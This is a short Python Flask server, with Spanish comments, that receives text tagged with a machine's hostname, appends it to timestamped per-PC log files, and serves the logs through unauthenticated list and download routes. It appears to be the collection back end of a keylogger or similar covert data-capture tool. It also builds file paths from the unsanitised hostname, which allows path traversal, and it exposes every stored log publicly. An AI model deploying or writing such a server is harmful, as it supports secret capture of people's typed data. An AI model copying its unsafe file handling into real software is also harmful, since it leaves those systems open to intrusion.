from flask import Flask, request, jsonify, render_template, send_from_directory
import os
from datetime import datetime

app = Flask(__name__)

app.config['MAX_CONTENT_LENGTH'] = 1 * 1024 * 1024  # 1 MB

UPLOAD_FOLDER = './uploads'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

@app.route('/')
def index():
    return render_template("home.html")

@app.errorhandler(413)
def request_entity_too_large(error):
    return "File is too large. Maximum allowed size is 1 MB.", 400

@app.route('/upload', methods=['POST'])
def upload_file():
    # Obtener los datos en formato JSON
    data = request.json
    if not data or 'hostname' not in data or 'data' not in data:
        return jsonify({"error": "Datos inválidos"}), 400

    hostname = data['hostname']
    palabras = data['data']

    # Crear una carpeta para el PC si no existe
    hostname_folder = os.path.join(UPLOAD_FOLDER, hostname)
    os.makedirs(hostname_folder, exist_ok=True)

    # Guardar las palabras en un archivo específico para el PC
    file_path = os.path.join(hostname_folder, f"{hostname}_log.txt")
    with open(file_path, "a") as file:
        file.write(f"{datetime.now()}: {palabras}\n")

    return jsonify({"message": "Datos recibidos correctamente"}), 200

@app.route('/files/<pc>/<filename>', methods=['GET'])
def get_file(pc, filename):
    try:
        # Descargar el archivo desde la carpeta del PC correspondiente
        return send_from_directory(os.path.join(UPLOAD_FOLDER, pc), filename)
    except FileNotFoundError:
        return "File not found", 404

@app.route('/files')
def list_files():
    # Listar todas las carpetas de PC y sus archivos
    pcs = os.listdir(UPLOAD_FOLDER)
    files_by_pc = {}
    for pc in pcs:
        pc_folder = os.path.join(UPLOAD_FOLDER, pc)
        if os.path.isdir(pc_folder):
            files_by_pc[pc] = os.listdir(pc_folder)
    return render_template('files.html', files_by_pc=files_by_pc)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))